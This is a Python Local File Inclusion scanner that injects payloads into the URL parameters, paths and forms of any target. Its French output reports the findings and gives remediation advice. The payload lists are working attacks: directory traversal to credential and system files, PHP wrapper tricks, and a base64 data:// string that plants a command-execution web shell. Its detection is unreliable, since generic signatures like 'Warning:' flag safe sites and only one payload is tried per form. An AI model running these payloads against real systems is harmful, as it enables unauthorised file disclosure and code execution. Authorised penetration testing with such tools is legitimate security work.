import argparse
import random
import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse, urlencode
import re
import io

# Ensure proper encoding for output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

class LFITester:
    def __init__(self, url, intensity='medium', auth=None, follow_redirects=True, max_depth=2):
        self.url = url
        self.intensity = intensity.lower()
        self.auth = auth
        self.follow_redirects = follow_redirects
        self.max_depth = max_depth
        self.timeout = 10 if intensity == 'thorough' else 5
        
        # Basic patterns to detect successful LFI
        self.lfi_signatures = [
            # Unix
            "root:x:",                     # /etc/passwd
            "root:*:",                     # /etc/shadow (partial)
            "nobody:x:",                   # /etc/passwd
            "www-data:x:",                 # /etc/passwd
            "daemon:",                     # /etc/passwd
            "# /etc/fstab:",               # /etc/fstab
            "# HEADER:",                   # Config files
            "# Begin /etc/hosts",          # /etc/hosts
            
            # Windows
            "[boot loader]",               # boot.ini
            "[operating systems]",         # boot.ini
            "[fonts]",                     # win.ini
            "C:\\Windows\\System32",       # Various Windows files
            "WINDOWS_NT\\CurrentVersion",  # Registry exports
            
            # Common config files
            "ServerRoot",                  # httpd.conf
            "DocumentRoot",                # httpd.conf
            "Listen 80",                   # httpd.conf
            "# Configuration file for the",# Various config files
            "database_host",               # config files
            "db_password",                 # config files
            "SMTP_HOST",                   # config files
            "PATH_INFO",                   # Environment variables
            
            # Log files indicators
            "[error]",                     # error logs
            "Unexpected error occurred",   # error logs
            "Warning:",                    # warning logs
            "stack trace:",                # error logs
            "exception in",                # error logs
            
            # PHP specific
            "PHP Parse error:",            # PHP error
            "Fatal error:",                # PHP error
            "Warning:",                    # PHP warning
            "<?php",                       # PHP code
            "// PHP",                      # PHP comment
            
            # Java specific
            "Exception in thread",         # Java exception
            "at java.lang.",               # Java stack trace
            "at javax.servlet.",           # Java servlet
            
            # Python specific
            "Traceback (most recent call", # Python traceback
            "File \"/",                    # Python file path in traceback
            "ImportError:",                # Python import error
            
            # ASP.NET
            "Server Error in '/' Application",  # ASP.NET error
            "Microsoft .NET Framework",     # ASP.NET
            
            # Successful include but no useful content
            "Failed opening required",     # PHP include failure
            "No such file or directory"    # File not found
        ]
        
        # Basic LFI payloads
        self.basic_payloads = [
            # Basic path traversal
            "../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\Windows\\win.ini",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
            
            # URL encoded path traversal
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
            
            # Common includes
            "/etc/passwd",
            "/etc/hosts",
            "C:\\Windows\\win.ini",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/httpd/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/error.log",
            "/var/log/httpd/error.log",
            "/var/www/logs/access.log",
            "/var/www/logs/error.log",
            "/usr/local/apache/logs/access.log",
            "/usr/local/apache/logs/error.log",
            "/opt/lampp/logs/access.log",
            "/opt/lampp/logs/error.log",
            "/opt/xampp/logs/access.log",
            "/opt/xampp/logs/error.log",
            "/etc/httpd/logs/access.log",
            "/etc/httpd/logs/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/sshd.log",
            "/var/log/mail",
            "/var/log/maillog",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "/proc/self/status",
            "/proc/version",
            "/proc/cmdline",
            "/proc/mounts",
        ]
        
        # Advanced LFI payloads for evading filters
        self.advanced_payloads = [
            # Double URL encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cwin.ini",
            
            # Path traversal with nullbyte (for older PHP versions)
            "../../../../../etc/passwd%00",
            "..\\..\\..\\..\\..\\Windows\\win.ini%00",
            
            # Path traversal with various representations
            "....//....//....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\....\\\\....\\\\Windows\\\\win.ini",
            ".../.../.../.../.../etc/passwd",
            "...\\...\\...\\...\\...\\Windows\\win.ini",
            "..//..//..//..//..//etc//passwd",
            "..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini",
            
            # Bypass using encoding variations
            "../../../../../etc/passwd%0A",  # Newline
            "../../../../../etc/passwd%09",  # Tab
            "../../../../../etc/passwd%0d",  # Carriage return
            
            # Bypass using wrappers (PHP)
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
            "expect://ls",
            "zip://shell.jpg%23payload.php",
            "phar://shell.jpg",
            "file:///etc/passwd",
            
            # Advanced Nullbyte combinations
            "../../../../../etc/passwd\0.jpg",
            "../../../../../etc/passwd\0.html",
            
            # Complex evasion techniques
            "/./././././././././././etc/passwd",
            "../../../../../../../../../etc/passwd/..",
            "/.../.../.../.../.../.../etc/passwd",
            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
            
            # OS specific files
            "/boot.ini",
            "/windows/win.ini",
            "/windows/system32/drivers/etc/hosts",
            "/windows/system32/cmd.exe",
            "/windows/system32/calc.exe"
        ]

        # Setup request details
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5"
        }
        
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # Authentication if provided
        if auth and 'username' in auth and 'password' in auth:
            self.perform_login(auth)

    def perform_login(self, auth):
        """Attempt to login with provided credentials"""
        if 'login_url' in auth and auth['login_url']:
            login_url = auth['login_url']
            username = auth['username']
            password = auth['password']
            
            # Try common login field names
            login_payloads = [
                {"username": username, "password": password},
                {"user": username, "pass": password},
                {"email": username, "password": password},
                {"login": username, "password": password},
                {"user_id": username, "password": password}
            ]
            
            # Try each payload
            for payload in login_payloads:
                try:
                    response = self.session.post(login_url, data=payload, timeout=self.timeout)
                    # Check if login was successful
                    if "logout" in response.text.lower() or "dashboard" in response.text.lower() or "profile" in response.text.lower():
                        print(f"[INFO] Login successful using fields: {payload.keys()}")
                        return True
                except:
                    continue
            
            print("[INFO] Login attempt failed")
        return False

    def extract_forms(self, url):
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=self.follow_redirects)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[INFO] Error extracting forms: {e}")
            return []

    def extract_form_details(self, form):
        details = {}
        # Get the form action
        action = form.get("action", "").strip()
        # If no form action specified, assume current page
        if action == "" or action is None:
            action = self.url
        
        # Make sure the URL is absolute
        action = urljoin(self.url, action)
        
        # Get the form method
        method = form.get("method", "get").lower()
        
        # Get form inputs
        inputs = []
        for input_tag in form.find_all(["input", "textarea", "select"]):
            input_type = input_tag.get("type", "text")
            input_name = input_tag.get("name")
            input_value = input_tag.get("value", "")
            
            if input_name:  # Skip inputs without names
                inputs.append({
                    "type": input_type,
                    "name": input_name,
                    "value": input_value
                })
                
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submit_form(self, form_details, payload):
        target_url = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]
        data = {}
        
        # Set cookies if needed
        cookies = self.session.cookies.get_dict()
        
        # Inject payload to a field that might be used for file inclusion
        file_related_fields = ['file', 'path', 'include', 'page', 'document', 'folder', 'root', 'path', 'pg', 'style', 
                              'pdf', 'template', 'php_path', 'doc', 'img', 'theme', 'module', 'view', 'layout']
        
        found_file_field = False
        
        # Look for fields likely to be used for file operations
        for input_field in inputs:
            field_name = input_field["name"]
            field_type = input_field["type"]
            
            # Check if field name contains any file-related keywords
            if any(keyword in field_name.lower() for keyword in file_related_fields):
                data[field_name] = payload
                found_file_field = True
            else:
                # Use the default value for other fields
                default_value = input_field.get("value", "")
                if field_type == "checkbox":
                    default_value = "on"  # Default value for checkboxes
                elif field_type == "submit":
                    default_value = "Submit"  # Default value for submit buttons
                
                data[field_name] = default_value
                
        # If no file-related fields found, try injecting into the first text field
        if not found_file_field:
            for input_field in inputs:
                field_name = input_field["name"]
                field_type = input_field["type"]
                
                if field_type in ["text", "search", "url", "hidden"] and field_name:
                    data[field_name] = payload
                    break
        
        try:
            if method == "post":
                response = self.session.post(target_url, data=data, cookies=cookies, timeout=self.timeout, allow_redirects=self.follow_redirects)
            else:  # GET
                response = self.session.get(target_url, params=data, cookies=cookies, timeout=self.timeout, allow_redirects=self.follow_redirects)
                
            return response
        except Exception as e:
            print(f"[INFO] Error submitting form: {e}")
            return None

    def test_url_parameters(self, url, payloads):
        """Test URL parameters for LFI"""
        vulnerable_params = []
        
        # Parse URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # No query parameters? Try some common ones
        if not query_params:
            test_params = ['file', 'page', 'include', 'doc', 'path', 'view', 'content', 'template', 'pg', 'root', 'folder']
            for param in test_params:
                for payload in payloads:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                    try:
                        response = self.session.get(test_url, headers=self.headers, 
                                                  timeout=self.timeout, allow_redirects=self.follow_redirects)
                        
                        # Check for signs of LFI
                        if self.check_lfi_success(response):
                            vulnerable_params.append((param, payload))
                            break
                    except requests.RequestException:
                        continue
        else:
            # Test each existing parameter
            for param, values in query_params.items():
                original_value = values[0] if values else ""
                
                for payload in payloads:
                    # Update this parameter with payload
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    
                    # Rebuild URL with new params
                    new_query = urlencode(new_params, doseq=True)
                    new_url = urlunparse((
                        parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                        parsed_url.params, new_query, parsed_url.fragment
                    ))
                    
                    try:
                        response = self.session.get(new_url, headers=self.headers, 
                                                  timeout=self.timeout, allow_redirects=self.follow_redirects)
                        
                        if self.check_lfi_success(response):
                            vulnerable_params.append((param, payload))
                            break
                    except requests.RequestException:
                        continue
        
        return vulnerable_params

    def test_path_traversal(self, url, payloads):
        """Test path-based traversal by appending to URL path"""
        vulnerable_paths = []
        
        # Parse URL to get base
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Generate path variations
        for payload in payloads:
            # Try appending directly to path
            test_url = f"{base_url}/{payload}"
            try:
                response = self.session.get(test_url, headers=self.headers, 
                                          timeout=self.timeout, allow_redirects=self.follow_redirects)
                if self.check_lfi_success(response):
                    vulnerable_paths.append((test_url, payload))
            except requests.RequestException:
                continue
                
            # Try with original path + payload
            if parsed_url.path and parsed_url.path != '/':
                test_url = f"{base_url}{parsed_url.path}/{payload}"
                try:
                    response = self.session.get(test_url, headers=self.headers, 
                                              timeout=self.timeout, allow_redirects=self.follow_redirects)
                    if self.check_lfi_success(response):
                        vulnerable_paths.append((test_url, payload))
                except requests.RequestException:
                    continue
        
        return vulnerable_paths

    def check_lfi_success(self, response):
        """Check if LFI was successful by looking for common signatures"""
        if response is None:
            return False
            
        # Check for common file signatures in the response
        for signature in self.lfi_signatures:
            if signature in response.text:
                return True
                
        # Check for abnormally large responses that might indicate file disclosure
        if len(response.text) > 1000 and (
            "root:" in response.text or 
            "[boot loader]" in response.text or
            "# HEADER:" in response.text or
            "<?php" in response.text
        ):
            return True
            
        # Recognize common file structures
        # /etc/passwd format: username:x:UID:GID:comment:home:shell
        if re.search(r'[\w-]+:x:\d+:\d+:[\w\s-]*:\/[\w\/]+:\/[\w\/]+', response.text):
            return True
            
        # Config file format
        if re.search(r'[#;]\s*Configuration file', response.text, re.IGNORECASE):
            return True
            
        return False

    def test_lfi(self):
        """Main method to test for LFI vulnerabilities"""
        is_vulnerable = False
        vulnerable_points = []
        
        # Determine which payloads to use based on intensity
        if self.intensity == 'fast':
            payloads = self.basic_payloads[:10]
        elif self.intensity == 'thorough':
            payloads = self.basic_payloads + self.advanced_payloads
        else:  # medium
            payloads = self.basic_payloads
            
        # Test URL parameters
        vulnerable_params = self.test_url_parameters(self.url, payloads)
        if vulnerable_params:
            is_vulnerable = True
            for param, payload in vulnerable_params:
                vulnerable_points.append(f"URL parameter: {param} with payload: {payload}")
            
        # Test path-based traversal if in medium or thorough mode
        if self.intensity in ['medium', 'thorough']:
            vulnerable_paths = self.test_path_traversal(self.url, payloads)
            if vulnerable_paths:
                is_vulnerable = True
                for path, payload in vulnerable_paths:
                    vulnerable_points.append(f"Path traversal: {path}")
            
        # Test all forms
        forms = self.extract_forms(self.url)
        for i, form in enumerate(forms):
            form_details = self.extract_form_details(form)
            
            for payload in payloads:
                response = self.submit_form(form_details, payload)
                if response and self.check_lfi_success(response):
                    is_vulnerable = True
                    form_location = f"Form #{i+1}"
                    if form_details["action"]:
                        form_location += f" (action: {form_details['action']})"
                    if form_details["inputs"]:
                        form_location += f" (fields: {', '.join([input_field['name'] for input_field in form_details['inputs'] if input_field['name']])})"
                    vulnerable_points.append(form_location)
                break

        # Output results in a format expected by server.js
        if is_vulnerable:
            print("[VULNERABLE] Le site est vulnérable aux attaques LFI (Local File Inclusion)")
            print(f"[LOCATION] {'; '.join(vulnerable_points)}")
            print("[PREVENTION] Pour prévenir le LFI:")
            print("1. Évitez d'utiliser les entrées utilisateur pour les noms de fichiers")
            print("2. Utilisez des listes blanches pour les fichiers autorisés")
            print("3. Désactivez les wrappers PHP comme php:// ou data:// si non utilisés")
            print("4. Mettez à jour le moteur PHP/serveur web aux dernières versions")
            print("5. Activez le mode_safe sur les serveurs PHP")
            print("6. Validez rigoureusement les entrées et utilisez des chemins de fichiers absolus")
            print("[DETAILS] L'inclusion de fichiers locaux (LFI) permet à un attaquant d'inclure des fichiers locaux sur le serveur, pouvant mener à la divulgation d'informations sensibles, l'exécution de code à distance ou l'inclusion de fichiers malveillants.")
            print("[IMPACT] Un attaquant pourrait accéder à des fichiers de configuration, des mots de passe, des informations sensibles du serveur, ou dans certains cas, exécuter du code malveillant sur le serveur.")
            print("[SEVERITY] HIGH")
            print("[REFERENCE] https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion")
        else:
            print("[OK] Le site n'est pas vulnérable aux attaques LFI (Local File Inclusion)")

def parse_arguments():
    parser = argparse.ArgumentParser(description='LFI Vulnerability Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--intensity', choices=['fast', 'medium', 'thorough'], default='medium',
                      help='Scan intensity: fast, medium, or thorough')
    parser.add_argument('--username', help='Username for authentication')
    parser.add_argument('--password', help='Password for authentication')
    parser.add_argument('--login-url', help='URL for login page')
    parser.add_argument('--follow-redirects', action='store_true', default=True, help='Follow HTTP redirects')
    parser.add_argument('--max-depth', type=int, default=2, help='Maximum depth for crawling')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    
    # Setup authentication if provided
    auth = None
    if args.username and args.password:
        auth = {
            'username': args.username,
            'password': args.password,
            'login_url': args.login_url
        }
    
    # Create and run the tester
    tester = LFITester(
        args.url, 
        intensity=args.intensity,
        auth=auth,
        follow_redirects=args.follow_redirects,
        max_depth=args.max_depth
    )
    tester.test_lfi()